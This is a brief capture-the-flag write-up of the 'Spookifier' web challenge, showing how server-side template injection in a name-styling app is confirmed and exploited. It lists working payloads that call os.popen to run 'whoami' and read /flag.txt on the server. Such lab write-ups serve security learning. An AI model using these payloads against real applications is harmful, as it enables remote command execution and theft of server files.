# Spookifier Write-up

Category: Web

CHALLENGE DESCRIPTION

There's a new trend of an application that generates a spooky name for you. Users of that application later discovered that their real names were also magically changed, causing havoc in their life. Could you help bring down this application?

![image](https://github.com/user-attachments/assets/89293205-d861-4bc7-9675-5c8084d5e71f)

We have userinput where our text is displayed in different fonts

![image](https://github.com/user-attachments/assets/d9d81d43-5bad-48c5-b6fb-280cd990252c)

We can try to put ssti payload

    ${7*7}

![image](https://github.com/user-attachments/assets/8bb65801-d552-4ff5-96f5-a61783b5029f)

    ${self.module.cache.util.os.popen('whoami').read()}

![image](https://github.com/user-attachments/assets/cf815f00-cd0e-431b-9d5a-fc6843806f8f)

    ${self.module.cache.util.os.popen('cat /flag.txt').read()}

![image](https://github.com/user-attachments/assets/d92b9df5-9922-441b-90a4-bfa66a91005a)
